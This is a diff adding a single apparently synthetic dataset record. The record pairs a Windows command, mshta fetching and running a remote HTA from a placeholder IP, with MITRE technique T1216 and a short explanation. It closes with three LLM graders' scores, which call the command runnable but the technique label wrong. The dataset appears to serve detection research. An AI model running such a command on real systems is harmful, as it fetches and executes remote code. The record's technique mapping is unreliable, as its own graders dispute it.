@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1216",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "mshta.exe http://203.0.113.44/portal.hta",
+  "explanation": "Executes a remote HTA application via the signed mshta host as a proxy, a classic system script proxy pattern under user context.",
+  "rationale_steps": [
+    "From PowerShell, start mshta pointing to a remote HTA over HTTP/HTTPS.",
+    "mshta retrieves and runs the HTA content without requiring elevated privileges.",
+    "Detection should focus on mshta with remote URLs and non-interactive invocation patterns."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1216-fce25ec9-1903ec35",
+  "source_prompt_hash": "fce25ec9",
+  "timestamp_utc": "2025-09-30T07:05:43.585605Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command cleanly invokes mshta.exe with a valid HTTP URL argument and requires no additional quoting or flags, making it well-formed and runnable.",
+        "semantic_score": 3,
+        "semantic_justification": "While it will execute a remote HTA via the signed mshta host under user context, this maps to Signed Binary Proxy Execution (T1218.005) rather than T1216 System Script Proxy Execution, so alignment with the stated technique is only partial.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:50:05.833011Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with no syntax errors, using mshta.exe followed by a valid URL argument with no quoting or escaping issues.",
+        "semantic_score": 3,
+        "semantic_justification": "While mshta.exe is a legitimate signed Windows binary used to proxy execution of remote HTA content (aligning with the general spirit of T1216), it is more precisely categorized under T1218.005 (Signed Binary Proxy Execution: Mshta) rather than T1216 (System Script Proxy Execution), which specifically covers signed scripts like PubPrn.vbs or SyncAppvPublishingServer.vbs invoked via script hosts; the command is operationally valid but misattributed to the stated technique.",
+        "combined_score": 4.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T00:13:57.199392Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is a perfectly well-formed Windows command that correctly invokes the mshta.exe binary with a valid URL parameter.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is operationally functional, it is misaligned with the specific MITRE technique; mshta.exe is categorized under T1218.005 (System Binary Proxy Execution), whereas T1216 specifically refers to the abuse of signed scripts like PubPrn.vbs or SyncAppvPublishingServer.vbs.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:14:01.092992Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
